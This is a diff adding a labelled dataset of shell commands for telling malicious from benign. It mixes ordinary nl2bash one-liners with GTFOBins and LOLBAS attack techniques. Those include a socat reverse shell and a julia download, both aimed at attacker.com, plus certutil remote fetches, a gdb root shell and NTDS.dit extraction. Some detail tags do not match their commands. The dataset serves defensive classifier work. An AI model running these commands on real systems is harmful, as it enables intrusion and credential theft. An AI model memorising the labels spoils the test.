@@ -1,0 +1,1237 @@
+{"command": "rundll32.exe shell32.dll,#44 {PATH:.dll}", "label": "malicious", "source": "lolbas", "detail": "Shell32.dll", "id": 0}
+{"command": "python -m http.server 80", "label": "malicious", "source": "gtfobins", "detail": "python", "id": 1}
+{"command": "pv file1 | wc -l", "label": "benign", "source": "nl2bash", "detail": null, "id": 2}
+{"command": "csh -c 'echo DATA >/path/to/output-file' -b", "label": "malicious", "source": "gtfobins", "detail": "csh", "id": 3}
+{"command": "read -r -p \"About to delete all items from history that match \\\"$param\\\". Are you sure? [y/N] \" response", "label": "benign", "source": "nl2bash", "detail": null, "id": 4}
+{"command": "mkdir mybuild", "label": "benign", "source": "nl2bash", "detail": null, "id": 5}
+{"command": "echo \"df -k;uname -a\" | ssh 192.168.79.134", "label": "benign", "source": "nl2bash", "detail": null, "id": 6}
+{"command": "find . -maxdepth 1 -type d -print0 | xargs -0 ls -d", "label": "benign", "source": "nl2bash", "detail": null, "id": 7}
+{"command": "nc victim.com 12345", "label": "malicious", "source": "gtfobins", "detail": "node", "id": 8}
+{"command": "find /home /opt -name test.txt", "label": "benign", "source": "nl2bash", "detail": null, "id": 9}
+{"command": "sort file.txt | rev | uniq -f 10 | rev", "label": "benign", "source": "nl2bash", "detail": null, "id": 10}
+{"command": "gcc -wrapper /bin/sh,-s x", "label": "malicious", "source": "gtfobins", "detail": "g++", "id": 11}
+{"command": "ash", "label": "malicious", "source": "gtfobins", "detail": "ash", "id": 12}
+{"command": "jsc.exe {PATH:.js}", "label": "malicious", "source": "lolbas", "detail": "Jsc.exe", "id": 13}
+{"command": "terraform console\nfile(\"/path/to/input-file\")", "label": "malicious", "source": "gtfobins", "detail": "terraform", "id": 14}
+{"command": "eqn /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "eqn", "id": 15}
+{"command": "find . -type f -exec grep -Iq . {} \\; -and -print0 | xargs -0 grep \"needle text\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 16}
+{"command": "mkdir -p -- \"$(dirname -- \"$f\")\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 17}
+{"command": "find . -type f -print0 | xargs -0 chmod go+r", "label": "benign", "source": "nl2bash", "detail": null, "id": 18}
+{"command": "Ldifde -i -f {PATH:.ldf}", "label": "malicious", "source": "lolbas", "detail": "Ldifde.exe", "id": 19}
+{"command": "readlink -f $(which firefox)", "label": "benign", "source": "nl2bash", "detail": null, "id": 20}
+{"command": "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe}", "label": "malicious", "source": "lolbas", "detail": "Wlrmdr.exe", "id": 21}
+{"command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}", "label": "malicious", "source": "lolbas", "detail": "Setupapi.dll", "id": 22}
+{"command": "ls -tQ | tail -n+4 | xargs rm", "label": "benign", "source": "nl2bash", "detail": null, "id": 23}
+{"command": "su -c 'bash --rcfile myfile'", "label": "benign", "source": "nl2bash", "detail": null, "id": 24}
+{"command": "file -bi myfile.txt", "label": "benign", "source": "nl2bash", "detail": null, "id": 25}
+{"command": "find . -type f -iname '*.cpp' -exec mv {} ./test/ \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 26}
+{"command": "find . -type f -newerct 2008-09-29 ! -newerct 2008-09-30", "label": "benign", "source": "nl2bash", "detail": null, "id": 27}
+{"command": "top -c -p $(pgrep -d',' -f string_to_match_in_cmd_line)", "label": "benign", "source": "nl2bash", "detail": null, "id": 28}
+{"command": "npm install -g yarn", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 29}
+{"command": "asterisk -r\n!/bin/sh", "label": "malicious", "source": "gtfobins", "detail": "asterisk", "id": 30}
+{"command": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"", "label": "malicious", "source": "lolbas", "detail": "msedge_proxy.exe", "id": 31}
+{"command": "hping3\n/bin/sh", "label": "malicious", "source": "gtfobins", "detail": "hping3", "id": 32}
+{"command": "find / -mtime -1", "label": "benign", "source": "nl2bash", "detail": null, "id": 33}
+{"command": "Presentationhost.exe {REMOTEURL}", "label": "malicious", "source": "lolbas", "detail": "Presentationhost.exe", "id": 34}
+{"command": "fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}", "label": "malicious", "source": "lolbas", "detail": "Fsutil.exe", "id": 35}
+{"command": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE", "label": "malicious", "source": "lolbas", "detail": "Msdt.exe", "id": 36}
+{"command": "find . -exec printf '%s\\0' {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 37}
+{"command": "find /path/to/dir -type f -exec sed '/@GROUP/,/@END_GROUP/!d' {} \\; | grep '_START'", "label": "benign", "source": "nl2bash", "detail": null, "id": 38}
+{"command": "find ./ -type f | tee /tmp/grep1 /tmp/grep2 >/dev/null", "label": "benign", "source": "nl2bash", "detail": null, "id": 39}
+{"command": "atftpd --no-fork --verbose --daemon --no-fork --user root.root .", "label": "malicious", "source": "gtfobins", "detail": "tftp", "id": 40}
+{"command": "find /some/dir/ -maxdepth 0 -empty -exec echo \"huzzah\" \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 41}
+{"command": "octave-cli --eval 'fid = fopen(\"/path/to/output-file\", \"w\"); fputs(fid, \"DATA\"); fclose(fid);'", "label": "malicious", "source": "gtfobins", "detail": "octave", "id": 42}
+{"command": "ls -ldt $(find .)", "label": "benign", "source": "nl2bash", "detail": null, "id": 43}
+{"command": "my_tmp_dir=$(mktemp -d --tmpdir=/tmp)", "label": "benign", "source": "nl2bash", "detail": null, "id": 44}
+{"command": "sed 's/.*/\\L&/'", "label": "benign", "source": "nl2bash", "detail": null, "id": 45}
+{"command": "explorer.exe {PATH_ABSOLUTE:.exe}", "label": "malicious", "source": "lolbas", "detail": "Explorer.exe", "id": 46}
+{"command": "find / -type f -perm 0777 -print -exec chmod 644 {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 47}
+{"command": "nano /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "pico", "id": 48}
+{"command": "ls -d */|sed 's|[/]||g'", "label": "benign", "source": "nl2bash", "detail": null, "id": 49}
+{"command": "ssh vagrant@127.0.0.1 -p 2222 -o Compression=yes -o DSAAuthentication=yes -o LogLevel=FATAL -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes -i ~/.vagrant.d/less_insecure_private_key -o ForwardAgent=yes", "label": "benign", "source": "nl2bash", "detail": null, "id": 50}
+{"command": "julia -e 'download(\"http://attacker.com/path/to/input-file\", \"/path/to/output-file\")'", "label": "malicious", "source": "gtfobins", "detail": "julia", "id": 51}
+{"command": "pic -U\n.PS\nsh X sh X", "label": "malicious", "source": "gtfobins", "detail": "pic", "id": 52}
+{"command": "nohup /path/to/command\ncat nohup.out", "label": "malicious", "source": "gtfobins", "detail": "nohup", "id": 53}
+{"command": "ECMangen.exe {REMOTEURL}", "label": "malicious", "source": "lolbas", "detail": "ECMangen.exe", "id": 54}
+{"command": "find . -not -wholename '*/vendor/*", "label": "benign", "source": "nl2bash", "detail": null, "id": 55}
+{"command": "echo '! exec /bin/sh' >/path/to/temp-file\nrunscript /path/to/temp-file", "label": "malicious", "source": "gtfobins", "detail": "runscript", "id": 56}
+{"command": "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}", "label": "malicious", "source": "lolbas", "detail": "msxsl.exe", "id": 57}
+{"command": "watch -n10 cat /tmp/iostat.running", "label": "benign", "source": "nl2bash", "detail": null, "id": 58}
+{"command": "tree -if | grep \\\\.[ch]\\\\b | xargs -n 1 grep -nH \"#include\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 59}
+{"command": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345", "label": "malicious", "source": "gtfobins", "detail": "socat", "id": 60}
+{"command": "tar xf /dev/null -I '/bin/sh -c \"/bin/sh 0<&2 1>&2\"'", "label": "malicious", "source": "gtfobins", "detail": "tar", "id": 61}
+{"command": "find dir -not -path '.git' -iname '*.py'", "label": "benign", "source": "nl2bash", "detail": null, "id": 62}
+{"command": "find /usr -name doc -type d", "label": "benign", "source": "nl2bash", "detail": null, "id": 63}
+{"command": "wsl.exe -e /mnt/c/Windows/System32/calc.exe", "label": "malicious", "source": "lolbas", "detail": "Wsl.exe", "id": 64}
+{"command": "find . -mtime +30 -a -mtime -7 -print0", "label": "benign", "source": "nl2bash", "detail": null, "id": 65}
+{"command": "winfile.exe {PATH:.exe}", "label": "malicious", "source": "lolbas", "detail": "winfile.exe", "id": 66}
+{"command": "certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt", "label": "malicious", "source": "lolbas", "detail": "Certutil.exe", "id": 67}
+{"command": "echo -e 'x:\\n\\t/bin/sh 1>&0 2>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\nacr -r ./relative/path/to/temp-file", "label": "malicious", "source": "gtfobins", "detail": "acr", "id": 68}
+{"command": "az group delete --name dev-rg --yes --no-wait", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 69}
+{"command": "find demo -depth -name .git -prune -o -print0 | cpio -0pdv --quiet demo_bkp", "label": "benign", "source": "nl2bash", "detail": null, "id": 70}
+{"command": "nc -l -p 12345 </path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "zsh", "id": 71}
+{"command": "csvtool trim t /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "csvtool", "id": 72}
+{"command": "find . -name \"*.pyc\"|xargs rm -rf", "label": "benign", "source": "nl2bash", "detail": null, "id": 73}
+{"command": "tmux", "label": "benign", "source": "nl2bash", "detail": null, "id": 74}
+{"command": "rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,", "label": "malicious", "source": "lolbas", "detail": "Advpack.dll", "id": 75}
+{"command": "find . -type f -exec basename {} \\; | wc -l", "label": "benign", "source": "nl2bash", "detail": null, "id": 76}
+{"command": "docker run --rm -it -v $(pwd):/app node:20 npm test", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 77}
+{"command": "echo DATA >/path/to/temp-file\necho /path/to/temp-file | cpio -udp .", "label": "malicious", "source": "gtfobins", "detail": "cpio", "id": 78}
+{"command": "find  /storage/sdcard0/tencent/MicroMsg/ -type f  -iname '*.jpg' -print0", "label": "benign", "source": "nl2bash", "detail": null, "id": 79}
+{"command": "scp user@server_b:/my_folder/my_file.xml user@server_b:/my_new_folder/", "label": "benign", "source": "nl2bash", "detail": null, "id": 80}
+{"command": "find . -type f -print0 | xargs -0 sed -i '' 's/2013/2012/g'", "label": "benign", "source": "nl2bash", "detail": null, "id": 81}
+{"command": "wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -notRestoreAcl -quiet", "label": "malicious", "source": "lolbas", "detail": "wbadmin.exe", "id": 82}
+{"command": "sudo apt-get update && sudo apt-get install -y build-essential", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 83}
+{"command": "dig +short myip.opendns.com @resolver1.opendns.com", "label": "benign", "source": "nl2bash", "detail": null, "id": 84}
+{"command": "md5sum *.txt | sort | perl -ne '($y,$f)=split; print \"$f\\n\" unless $y eq $x; $x=$y'", "label": "benign", "source": "nl2bash", "detail": null, "id": 85}
+{"command": "find . \\( ! -name . -prune \\)", "label": "benign", "source": "nl2bash", "detail": null, "id": 86}
+{"command": "ascii-xfr -ns /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "ascii-xfr", "id": 87}
+{"command": "find . -mindepth 2 -maxdepth 2 -name \"*.so\" -printf \"mv '%h/%f' '%h/lib%f'\\n\" | sh", "label": "benign", "source": "nl2bash", "detail": null, "id": 88}
+{"command": "grep -n 'something' HUGEFILE | head -n 1", "label": "benign", "source": "nl2bash", "detail": null, "id": 89}
+{"command": "tar -c --use-compress-program=pigz -f tar.file dir_to_zip", "label": "benign", "source": "nl2bash", "detail": null, "id": 90}
+{"command": "find /tmp -type f -mtime +30 -exec rm -f {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 91}
+{"command": "echo `uname -a | awk '{print $2}'`", "label": "benign", "source": "nl2bash", "detail": null, "id": 92}
+{"command": "find . -type f -mtime -7 | xargs tar -cvf `date '+%d%m%Y'_archive.tar`", "label": "benign", "source": "nl2bash", "detail": null, "id": 93}
+{"command": "find . -name '*.png' | grep -f <(sed s?^?/[0-9]_[0-9]_[0-9]_? search.txt)", "label": "benign", "source": "nl2bash", "detail": null, "id": 94}
+{"command": "find -maxdepth 1 -type f newermt \"$timestamp\"'", "label": "benign", "source": "nl2bash", "detail": null, "id": 95}
+{"command": "sqldumper.exe 540 0 0x01100:40", "label": "malicious", "source": "lolbas", "detail": "Sqldumper.exe", "id": 96}
+{"command": "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"/path/to/output-file\", \"wb\");\n  f:write(d);\n  io.close(f);'", "label": "malicious", "source": "gtfobins", "detail": "lua", "id": 97}
+{"command": "fg", "label": "benign", "source": "nl2bash", "detail": null, "id": 98}
+{"command": "ginsh\n!/bin/sh", "label": "malicious", "source": "gtfobins", "detail": "ginsh", "id": 99}
+{"command": "find . -type f -name \".*\" -newer .cshrc -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 100}
+{"command": "crash -h", "label": "malicious", "source": "gtfobins", "detail": "crash", "id": 101}
+{"command": "find . -type f -ls | awk '{print $(NF-3), $(NF-2), $(NF-1), $NF}'", "label": "benign", "source": "nl2bash", "detail": null, "id": 102}
+{"command": "dotnet fsi\nSystem.IO.File.ReadAllText(\"/path/to/input-file\");;", "label": "malicious", "source": "gtfobins", "detail": "dotnet", "id": 103}
+{"command": "find /tmp -type d -empty", "label": "benign", "source": "nl2bash", "detail": null, "id": 104}
+{"command": "tail -n +2 foo.txt", "label": "benign", "source": "nl2bash", "detail": null, "id": 105}
+{"command": "jjs\nJava.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty').waitFor()", "label": "malicious", "source": "gtfobins", "detail": "jjs", "id": 106}
+{"command": "run-mailcap --action=view text/plain:/etc/hosts", "label": "malicious", "source": "gtfobins", "detail": "run-mailcap", "id": 107}
+{"command": "Extexport.exe {PATH_ABSOLUTE:folder} foo bar", "label": "malicious", "source": "lolbas", "detail": "Extexport.exe", "id": 108}
+{"command": "scp -v /my_folder/my_file.xml user@server_b:/my_new_folder/", "label": "benign", "source": "nl2bash", "detail": null, "id": 109}
+{"command": "awk '{print $2}' < file.txt | paste -s -d, -", "label": "benign", "source": "nl2bash", "detail": null, "id": 110}
+{"command": "pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'", "label": "malicious", "source": "gtfobins", "detail": "pdflatex", "id": 111}
+{"command": "find dir -not -path '.git' -iname '*.py' -print0 | xargs -0 sed --in-place=.bak 's/[[:space:]]*$//'.", "label": "benign", "source": "nl2bash", "detail": null, "id": 112}
+{"command": "find /home -type f -name \"*.ext\" -exec sed -i -e \"s/\\r$//g\" {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 113}
+{"command": "ls -l | head -2 | tail -1", "label": "benign", "source": "nl2bash", "detail": null, "id": 114}
+{"command": "find ~/ -maxdepth 3 -name teste.tex", "label": "benign", "source": "nl2bash", "detail": null, "id": 115}
+{"command": "chown user2:user2 -R subdir2", "label": "benign", "source": "nl2bash", "detail": null, "id": 116}
+{"command": "cp /bin/sh /path/to/temp-dir/zypper-x\nPATH=$PATH:/path/to/temp-dir/ zypper x", "label": "malicious", "source": "gtfobins", "detail": "zypper", "id": 117}
+{"command": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}", "label": "malicious", "source": "lolbas", "detail": "Dfshim.dll", "id": 118}
+{"command": "pic /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "pic", "id": 119}
+{"command": "psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0", "label": "malicious", "source": "lolbas", "detail": "Psr.exe", "id": 120}
+{"command": "find $sourcePath -type f -mtime +10 -name \"*.log\" -exec mv {} $destPath \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 121}
+{"command": "find . -maxdepth 1 -type d -print0 | xargs -0 -I {} sh -c 'echo -e $(find \"{}\" -printf \"\\n\" | wc -l) \"{}\"' | sort -n", "label": "benign", "source": "nl2bash", "detail": null, "id": 122}
+{"command": "cal | awk 'NR==2 {split($0,a)} {for (i=1;i<=NF;i++) if ($i==date) print a[i]}' FIELDWIDTHS=\"3 3 3 3 3 3 3 3\" date=31", "label": "benign", "source": "nl2bash", "detail": null, "id": 123}
+{"command": "find / -group staff -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 124}
+{"command": "echo DATA | less\ns/path/to/output-file\nq", "label": "malicious", "source": "gtfobins", "detail": "less", "id": 125}
+{"command": "echo /path/to/command >/path/to/temp-file\nchmod +x /path/to/temp-file\naria2c --on-download-error=/path/to/temp-file http://some-invalid-domain", "label": "malicious", "source": "gtfobins", "detail": "aria2c", "id": 126}
+{"command": "find -mmin -60", "label": "benign", "source": "nl2bash", "detail": null, "id": 127}
+{"command": "ls -ld /tmp /tnt", "label": "benign", "source": "nl2bash", "detail": null, "id": 128}
+{"command": "echo -e \"ONBOOT=\\\"YES\\\"\\nIPADDR=10.42.84.168\\nPREFIX=24\" | sudo tee -a /etc/sysconfig/network-scripts/ifcfg-eth4", "label": "benign", "source": "nl2bash", "detail": null, "id": 129}
+{"command": "find . -regextype posix-egrep -regex \"./c(([4-6][0-9])|70)_data.txt\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 130}
+{"command": "find . -type f ! -size 0", "label": "benign", "source": "nl2bash", "detail": null, "id": 131}
+{"command": "find /apps/ -user root -type f -amin -2 -name *.rb", "label": "benign", "source": "nl2bash", "detail": null, "id": 132}
+{"command": "find /tmp -size -100c", "label": "benign", "source": "nl2bash", "detail": null, "id": 133}
+{"command": "cat >/path/to/temp-file <<EOF\nuser root;\nhttp {\n  server {\n    listen 80;\n    root /;\n    autoindex on;\n    dav_methods PUT;\n  }\n}\nevents {}\nEOF\n\nnginx -c /path/to/temp-file", "label": "malicious", "source": "gtfobins", "detail": "nginx", "id": 134}
+{"command": "find / -name filename -exec  nano '{}' \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 135}
+{"command": "find / -name '*.txt' -exec du -hc {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 136}
+{"command": "find /some/directory -user joebob -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 137}
+{"command": "find sort_test/ -type f | env -i LC_COLLATE=C sort", "label": "benign", "source": "nl2bash", "detail": null, "id": 138}
+{"command": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'", "label": "malicious", "source": "gtfobins", "detail": "node", "id": 139}
+{"command": "ruby -e 'puts File.read(\"/path/to/input-file\")'", "label": "malicious", "source": "gtfobins", "detail": "ruby", "id": 140}
+{"command": "rpm --eval '%(/bin/sh 1>&2)'", "label": "malicious", "source": "gtfobins", "detail": "rpm", "id": 141}
+{"command": "find /usr/bin -type f -size -50c -exec ls -l '{}' ';'", "label": "benign", "source": "nl2bash", "detail": null, "id": 142}
+{"command": "gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit", "label": "malicious", "source": "gtfobins", "detail": "gdb", "id": 143}
+{"command": "find \"$dir\" -name \"*.mod\" -type f -print0", "label": "benign", "source": "nl2bash", "detail": null, "id": 144}
+{"command": "find \"$somedir\" -maxdepth 0 -empty -exec echo {} is empty. \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 145}
+{"command": "appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml}", "label": "malicious", "source": "lolbas", "detail": "AppCert.exe", "id": 146}
+{"command": "socat tcp-connect:attacker.com:12345 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'", "label": "malicious", "source": "gtfobins", "detail": "socat", "id": 147}
+{"command": "sed -n '1e exec /bin/sh 1>&0' /etc/hosts", "label": "malicious", "source": "gtfobins", "detail": "sed", "id": 148}
+{"command": "python -m http.server 80", "label": "malicious", "source": "gtfobins", "detail": "bash", "id": 149}
+{"command": "find . -print|xargs command", "label": "benign", "source": "nl2bash", "detail": null, "id": 150}
+{"command": "task execute /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "task", "id": 151}
+{"command": "find $PATH_TO_LOGS -maxdepth 1 -mtime +$SOME_NUMBER_OF_DAYS -exec gzip -N {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 152}
+{"command": "echo DATA | xxd | xxd -r - /path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "xxd", "id": 153}
+{"command": "find . -name '*bills*' -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 154}
+{"command": "head -c 10 \"$0\" | tr '\\000-\\377' '#'", "label": "benign", "source": "nl2bash", "detail": null, "id": 155}
+{"command": "find . \\( -name '*.bak' -o -name *.backup \\) -type f -atime +30 -exec rm '{}' ';'", "label": "benign", "source": "nl2bash", "detail": null, "id": 156}
+{"command": "rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1", "label": "malicious", "source": "lolbas", "detail": "rdrleakdiag.exe", "id": 157}
+{"command": "history -c", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 158}
+{"command": "find . -type d -printf \"%A@ %p\\n\" | sort -n | tail -n 1 | cut -d \" \" -f 2-", "label": "benign", "source": "nl2bash", "detail": null, "id": 159}
+{"command": "find . -user <userid>", "label": "benign", "source": "nl2bash", "detail": null, "id": 160}
+{"command": "find ./ -type f -exec wc -l {}  \\; | cut -d' ' -f1 | paste -sd+ | bc", "label": "benign", "source": "nl2bash", "detail": null, "id": 161}
+{"command": "less /etc/hosts\n:e /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "less", "id": 162}
+{"command": "sleep `10`", "label": "benign", "source": "nl2bash", "detail": null, "id": 163}
+{"command": "find /path/* -maxdepth 0 -type d -exec sudo tar -zcpvf {}.tar.gz {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 164}
+{"command": "brew install --cask docker", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 165}
+{"command": "echo /path/to/input-file | cpio -dp .\ncat path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "cpio", "id": 166}
+{"command": "find . \u2013type f -mmin -10", "label": "benign", "source": "nl2bash", "detail": null, "id": 167}
+{"command": "dstat --xxx", "label": "malicious", "source": "gtfobins", "detail": "dstat", "id": 168}
+{"command": "find . -type f -exec md5sum {} \\; > MD5SUMS", "label": "benign", "source": "nl2bash", "detail": null, "id": 169}
+{"command": "winrm invoke Create wmicimv2/Win32_Process @{CommandLine=\"{CMD}\"} -r:http://target:5985", "label": "malicious", "source": "lolbas", "detail": "winrm.vbs", "id": 170}
+{"command": "cat >/path/to/temp-dir/x<<EOF\n[main]\nplugins=1\npluginpath=/path/to/temp-dir/\npluginconfpath=/path/to/temp-dir/\nEOF\n\ncat >/path/to/temp-dir/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >/path/to/temp-dir/y.py<<EOF\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  ...\nEOF\n\nyum -c /path/to/temp-dir/x --enableplugin=y", "label": "malicious", "source": "gtfobins", "detail": "yum", "id": 171}
+{"command": "find . -type f", "label": "benign", "source": "nl2bash", "detail": null, "id": 172}
+{"command": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset", "label": "malicious", "source": "lolbas", "detail": "Bitsadmin.exe", "id": 173}
+{"command": "find . -name \"*.txt\" | parallel -Xj1 --tty vim", "label": "benign", "source": "nl2bash", "detail": null, "id": 174}
+{"command": "cat /file/with/numbers | php -r '$s = 0; while (true) { $e = fgets(STDIN); if (false === $e) break; $s += $e; } echo $s;'", "label": "benign", "source": "nl2bash", "detail": null, "id": 175}
+{"command": "Mftrace.exe {PATH:.exe}", "label": "malicious", "source": "lolbas", "detail": "Mftrace.exe", "id": 176}
+{"command": "find \"$somedir\" -type f -exec echo Found unexpected file {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 177}
+{"command": "find /home/peter -name *~ -print0 |xargs -0 rm", "label": "benign", "source": "nl2bash", "detail": null, "id": 178}
+{"command": "ispell /etc/hosts\n!/bin/sh", "label": "malicious", "source": "gtfobins", "detail": "ispell", "id": 179}
+{"command": "Update.exe --processStart {PATH:.exe} --process-start-args \"{CMD:args}\"", "label": "malicious", "source": "lolbas", "detail": "Update.exe", "id": 180}
+{"command": "VISUAL='/bin/sh -s --' less /etc/hosts\nv", "label": "malicious", "source": "gtfobins", "detail": "less", "id": 181}
+{"command": "find . -type d -name files -exec chmod ug+rwx,o-rwx {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 182}
+{"command": "sudo chown `whoami` /data/db", "label": "benign", "source": "nl2bash", "detail": null, "id": 183}
+{"command": "who | awk -F '[()]' '/orschiro/{print $(NF-1)}' | grep -v orschiro | uniq", "label": "benign", "source": "nl2bash", "detail": null, "id": 184}
+{"command": "ssh -l ${USERNAME} ${HOSTNAME} \"${SCRIPT}\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 185}
+{"command": "sudo mkdir /data/db", "label": "benign", "source": "nl2bash", "detail": null, "id": 186}
+{"command": "gunzip -c openssl-fips-2.0.1.tar.gz | tar xf \u00ad-", "label": "benign", "source": "nl2bash", "detail": null, "id": 187}
+{"command": "bzip2 -kv */*/*/*/*", "label": "benign", "source": "nl2bash", "detail": null, "id": 188}
+{"command": "set | more", "label": "benign", "source": "nl2bash", "detail": null, "id": 189}
+{"command": "gh pr merge 42 --squash --delete-branch", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 190}
+{"command": "zsh -c 'echo \"$(</path/to/input-file)\"'", "label": "malicious", "source": "gtfobins", "detail": "zsh", "id": 191}
+{"command": "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}", "label": "malicious", "source": "lolbas", "detail": "Mmc.exe", "id": 192}
+{"command": "sudo rm -rf bin/node bin/node-waf include/node lib/node lib/pkgconfig/nodejs.pc share/man/man1/node", "label": "benign", "source": "nl2bash", "detail": null, "id": 193}
+{"command": "nc -l -p 12345 >/path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "curl", "id": 194}
+{"command": "cat >/path/to/temp-file <<EOF\nmodule(load=\"imuxsock\")\n:msg, contains, \"somerandomstring\" ^/path/to/command\nEOF\n\nrsyslogd -f /path/to/temp-file", "label": "malicious", "source": "gtfobins", "detail": "rsyslogd", "id": 195}
+{"command": "yes | cp -rf /zzz/zzz/* /xxx/xxx", "label": "benign", "source": "nl2bash", "detail": null, "id": 196}
+{"command": "gcloud help", "label": "malicious", "source": "gtfobins", "detail": "gcloud", "id": 197}
+{"command": "find . -type f -name \"*.java\" | xargs>    tar cvf myfile.tar", "label": "benign", "source": "nl2bash", "detail": null, "id": 198}
+{"command": "find -mmin +60", "label": "benign", "source": "nl2bash", "detail": null, "id": 199}
+{"command": "sysctl 'kernel.core_pattern=|/path/to/command'", "label": "malicious", "source": "gtfobins", "detail": "sysctl", "id": 200}
+{"command": "vi /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "vi", "id": 201}
+{"command": "find dir -name image\\*.jpg -exec /bin/ksh script.ksh {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 202}
+{"command": "find /home/archive -type f -name \"*.csv\"  -mtime -2 -exec gzip -9f {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 203}
+{"command": "find . -group staff -perm -2000 -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 204}
+{"command": "certutil -decode {PATH:.base64} {PATH}", "label": "malicious", "source": "lolbas", "detail": "Certutil.exe", "id": 205}
+{"command": "find . -exec touch {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 206}
+{"command": "screen -ls", "label": "benign", "source": "nl2bash", "detail": null, "id": 207}
+{"command": "find . -group root -print | xargs chown temp", "label": "benign", "source": "nl2bash", "detail": null, "id": 208}
+{"command": "openvpn --config /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "openvpn", "id": 209}
+{"command": "ranger\nS", "label": "malicious", "source": "gtfobins", "detail": "ranger", "id": 210}
+{"command": "find . -not -path '*/\\.*' -type f -name '*some text*'", "label": "benign", "source": "nl2bash", "detail": null, "id": 211}
+{"command": "gcloud compute instances delete old-vm --zone us-central1-a --quiet", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 212}
+{"command": "mpiexec.exe {CMD}", "label": "malicious", "source": "lolbas", "detail": "Mpiexec.exe", "id": 213}
